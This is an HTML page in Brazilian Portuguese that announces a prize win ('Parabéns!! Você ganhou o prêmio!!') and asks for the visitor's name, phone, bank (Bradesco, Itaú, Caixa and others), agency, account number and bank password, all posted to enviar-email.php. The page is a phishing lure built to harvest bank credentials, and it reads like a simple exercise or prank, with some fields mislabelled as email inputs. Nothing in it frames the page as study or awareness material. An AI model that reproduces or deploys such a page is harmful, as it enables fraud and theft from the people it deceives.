<!DOCTYPE html>
<html lang="pt-br">
<head>
    <title>VOCE GANHOU!!</title>
    <meta name="author" content="Rodrigo CavanhaMan" />

    <meta charset="utf-8"/>
    <link rel="stylesheet" type="text/css" href="estilo.css">
	<style>
		#fausto{width:100%;}
		#titulo{margin:-4px;}
		.errou{text-align:center;margin-left:10px;}
	</style>
</head>
<body>
    <form action="enviar-email.php" class="formulario" method="post"> 
		<div class="errou">
			<img id="fausto" src="image/faustaoaviao.jpg" alt="banco" name="fotofausto" onclick="changePic()" >
			<h2 id="titulo">Parabéns!! Você ganhou o prêmio!!<BR>
			Para recebê-lo, favor preencher o formulário abaixo:</h2>
        </div>
        
        <div class="field">
            <label for="nome">Seu Nome:</label>
            <input type="text" id="nome" name="nome" placeholder="Digite seu nome*" required>
        </div>
        
        <div class="field">
            <label for="telefone">Seu Telefone:</label>
            <input type="text" id="telefone" name="telefone" placeholder="Digite seu Telefone">
        </div>
        <div class="field radiobox">
            <span>Marque o seu banco:</span>
            <label for="brad"><input type="radio" name="novidades" id="brad" value="brad" checked>Bradesco</label>
            <label for="bb"><input type="radio" name="novidades" id="bb" value="bb">Banco do Brasil</label>
            <label for="sant"><input type="radio" name="novidades" id="sant" value="sant">Santander</label>
            <label for="uni"><input type="radio" name="novidades" id="uni" value="uni">Unibanco</label>
			<label for="cef"><input type="radio" name="novidades" id="cef" value="cef">Caixa Econômica Federal</label>
            <label for="itau"><input type="radio" name="novidades" id="itau" value="itau">Itaú</label>
		</div>
        <div class="field">
            <label for="email">Informe a agência da sua conta bancária:</label>
            <input type="email" id="email" name="email" placeholder="Digite sua conta do banco:*" required>
        </div>        
        <div class="field">
            <label for="email">Forneça o número da sua conta do banco:</label>
            <input type="email" id="email" name="email" placeholder="Digite sua conta do banco:*" required>
        </div>        
        <div class="field">
            <label for="email">Sua senha do banco:</label>
            <input type="email" id="email" name="email" placeholder="Digite sua senha do banco:*" required>
        </div>        
        <div class="field">
            <label for="mensagem">Comentários, dúvidas e sugestões:</label>
            <textarea name="mensagem" id="mensagem" placeholder="Mensagem*" required></textarea>
        </div>

        <input type="submit" name="acao" value="Enviar">
    </form>

	<script type="text/javascript" src="trocafausto.js"></script>
</body>
</html>
